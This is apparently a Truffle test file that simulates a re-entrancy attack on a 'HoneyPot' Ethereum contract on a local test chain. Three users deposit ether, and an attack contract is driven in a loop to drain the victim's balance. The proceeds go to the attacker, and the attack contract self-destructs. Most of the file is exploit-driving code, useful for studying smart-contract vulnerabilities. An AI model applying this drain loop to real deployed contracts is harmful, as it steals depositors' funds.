

const HoneyPotLogic = artifacts.require('HoneyPotLogic');
const AttackCtrt = artifacts.require('HoneyPotAttack');
const HoneyPotData = artifacts.require('HoneyPotData');

contract('Re-entrancy test', async (accounts) => 
{
    const zero = 0x0000000000000000000000000000000000000000;
    const ether = web3.utils.toWei('1', 'ether');

    let dataAddr = accounts[2];
    console.log(`data address is ${dataAddr}`);
    let owner = accounts[0];
    console.log(`victim address is ${owner}`);
    let attacker = accounts[1];
    console.log(`attacker address is ${attacker}`);

    let user1 = accounts[3];
    let user2 = accounts[4];
    let user3 = accounts[5];

    let honeyPotLogic;
    let attackCtrtContract;
    let honeyPotData;

    before(async () => 
    {
        await web3.eth.sendTransaction(
            { 
                from: attacker, 
                to: owner.address, 
                value: web3.utils.toBN(ether).mul(web3.utils.toBN(10)) 
            });
        honeyPotData = await HoneyPotData.deployed({from: dataAddr});
        if (honeyPotData) {
            console.log(`data contract address: ${honeyPotData.address}`);
            honeyPotLogic = await HoneyPotLogic.deployed({arguments: [honeyPotData.address]}, { from: owner });
            if (honeyPotLogic) {
                console.log(`logic contract address: ${honeyPotLogic.address}`);
                attackCtrtContract = await AttackCtrt.deployed(
                    {arguments: [honeyPotLogic.address]}, { from: attacker });
                    if (attackCtrtContract) {
                        console.log(`attack contract address: ${attackCtrtContract.address}`);
                        console.log(`deployed All contracts successfully`);
                    }
            } else {
                console.log(`deployed contracts Logic contract failed`);
            }            
        } else {
            console.log(`deployed contracts Data contract failed`);
        }
      
    });
    
    describe('get() test', () => 
    {
        it('attacker uses the re-entrancy bug to drain funds', async () => 
        {
            console.log('accounts status before hack');
            
            let ownerBalance = await web3.eth.getBalance(owner);
            let attackerBalance = await web3.eth.getBalance(attacker);

            let user1Balance = await web3.eth.getBalance(user1);
            let user2Balance = await web3.eth.getBalance(user2);
            let user3Balance = await web3.eth.getBalance(user3);

            console.log('\nowner balance: ' + ownerBalance / ether);

            console.log('attacker balance: ' + attackerBalance / ether);
            console.log('user #1 balance: ' + user1Balance / ether);
            console.log('user #2 balance: ' + user2Balance / ether);
            console.log('user #3 balance: ' + user3Balance / ether);

            await honeyPotLogic.put(
                { 
                    from: user1, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(850)) 
                });
            await honeyPotLogic.put(
                { 
                    from: user2, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(400)) 
                });
            await honeyPotLogic.put(
                { 
                    from: user3, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(950)) 
                });

            let honeyPotLogicBalance = await web3.eth.getBalance(honeyPotLogic.address);
            let attackCtrtContractBalance = await web3.eth.getBalance(attackCtrtContract.address);

            console.log('honeyPotLogic balance: ' + honeyPotLogicBalance / ether);
            console.log('attackCtrt balance: ' + attackCtrtContractBalance / ether);

            console.log('\nperforming attack...');
            let currentIteration = 0;
            let maxIterations = 100;
            let triggerAmount = web3.utils.toBN(0.01 * ether);
            let leftoverAmount = web3.utils.toBN(0.001 * ether);
            let collectIterations = web3.utils.toBN(10);
            while(web3.utils.toBN(honeyPotLogicBalance)
                .gt(web3.utils.toBN(leftoverAmount))
                && maxIterations > currentIteration)
            {
                currentIteration++;
                console.log('\niteration ' + currentIteration);
                
                console.log('trigger amount ' + triggerAmount / ether);
               console.log(`attacker address is ${attacker}`);
               const _getOwner = await attackCtrtContract.getOwner();
               console.log(`owner = attacker address = ${_getOwner}`);
                let amountToSend = web3.utils.toBN(triggerAmount);
                await attackCtrtContract.collect(
                    collectIterations, 
                    { 
                        from: attacker, 
                        value: amountToSend
                    });
   
                honeyPotLogicBalance = await web3.eth.getBalance(honeyPotLogic.address);
                attackCtrtContractBalance = await web3.eth.getBalance(attackCtrtContract.address);
                attackerBalance = await web3.eth.getBalance(attacker);

                console.log('honeyPotLogic balance ' + honeyPotLogicBalance / ether);
                console.log('attackCtrt balance ' + attackCtrtContractBalance / ether);
                console.log('attacker balance ' + attackerBalance / ether);

                await attackCtrtContract.withdraw(
                    attacker, 
                    web3.utils.toBN(attackCtrtContractBalance).mul(web3.utils.toBN(5)).div(web3.utils.toBN(10)), 
                    { from: attacker });
                console.log('transferred amount from attackCtrt to attacker');

                honeyPotLogicBalance = await web3.eth.getBalance(honeyPotLogic.address);
                attackCtrtContractBalance = await web3.eth.getBalance(attackCtrtContract.address);
                attackerBalance = await web3.eth.getBalance(attacker);

                console.log('honeyPotLogic balance ' + honeyPotLogicBalance / ether);
                console.log('attackCtrt balance ' + attackCtrtContractBalance / ether);
                console.log('attacker balance ' + attackerBalance / ether);

                triggerAmount = web3.utils.toBN(triggerAmount).mul(web3.utils.toBN(10));
                if(web3.utils.toBN(triggerAmount).gt(web3.utils.toBN(attackerBalance)))
                {
                    triggerAmount = web3.utils.toBN(attackerBalance).mul(web3.utils.toBN(8)).div(web3.utils.toBN(10));
                }
                if(web3.utils.toBN(triggerAmount).gt(web3.utils.toBN(honeyPotLogicBalance)))
                {
                    triggerAmount = web3.utils.toBN(honeyPotLogicBalance);
                }
            }

            await attackCtrtContract.kill(attacker, { from: attacker });
            console.log('attackCtrt contract killed');

            console.log('\nend');
            
            honeyPotLogicBalance = await web3.eth.getBalance(honeyPotLogic.address);
            attackCtrtContractBalance = await web3.eth.getBalance(attackCtrtContract.address);
            attackerBalance = await web3.eth.getBalance(attacker);

            console.log('honeyPotLogic balance ' + honeyPotLogicBalance / ether);
            console.log('attackCtrt balance ' + attackCtrtContractBalance / ether);
            console.log('attacker balance ' + attackerBalance / ether);
        });
    });

});